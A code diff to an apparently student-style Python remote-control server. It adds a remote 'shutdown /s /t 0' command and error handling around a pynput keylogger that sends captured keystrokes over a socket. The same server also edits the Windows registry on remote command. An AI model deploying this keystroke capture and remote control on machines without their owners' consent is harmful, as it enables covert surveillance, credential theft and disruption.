@@ -130,6 +130,8 @@ class Client:
                     self.getCreateReyKey()
                 elif flag == 'regdelkey':
                     self.getDelRegKey()
+                elif flag == 'shutdown':
+                    self.getShutdown() 
                 elif flag == 'close':
                     self.closeConnection()
             except socketutils.ConnectionClosed:
@@ -245,7 +247,7 @@ class Client:
             nID = win32process.GetWindowThreadProcessId(hwnd)
 
             if name != '' and isVisible:
-                result.append(nID[1])
+                result.append(str(nID[1]))
             return True
 
         print(f'{self.addr} \tSEND APP LIST')
@@ -280,26 +282,44 @@ class Client:
                 #     string = string[:-1]
                 else:
                     string += f'[{_key}]'
-
+            except:
+                pass
+            
         while True:
             flag = self.buff.recv_until(self.DELIM).decode()
             print(f'{self.addr} \t\tReceive: {flag}')
             
             if flag == 'hook' and listener == None:
-                listener = keyboard.Listener(on_press = on_press)
-                listener.start()
+                try:
+                    listener = keyboard.Listener(on_press = on_press)
+                    listener.start()
+                except:
+                    listener = None
+                    self.buff.send('ER'.encode() + self.DELIM)
+                else:
+                    self.buff.send('OK'.encode() + self.DELIM)
+
             elif flag == 'unhook' and listener != None:
-                listener.stop()
-                listener = None
+                try:
+                    listener.stop()
+                finally:
+                    listener = None
+
             elif flag == 'clear':
                 string = ''
+
             elif flag == 'send':
                 self.buff.send(string.encode() + self.DELIM)
+
             elif flag == 'exit':
                 if listener != None:
-                    listener.stop()
+                    try:
+                        listener.stop()
+                    except:
+                        pass
                 break
-            
+
+
     def getRegFile(self):
         print(f'{self.addr} \tMERGE REG FILE')
         data = self.buff.recv_until(self.DELIM).decode()
@@ -390,6 +410,14 @@ class Client:
             self.buff.send('ER'.encode() + self.DELIM)
         else:
             self.buff.send('OK'.encode() + self.DELIM)
+
+    
+    def getShutdown(self):
+        print(f'{self.addr} \tSHUTDOWN')
+        try:
+            subprocess.run('shutdown /s /t 0')
+        except:
+            pass
         
 
 def getHKEY(name):
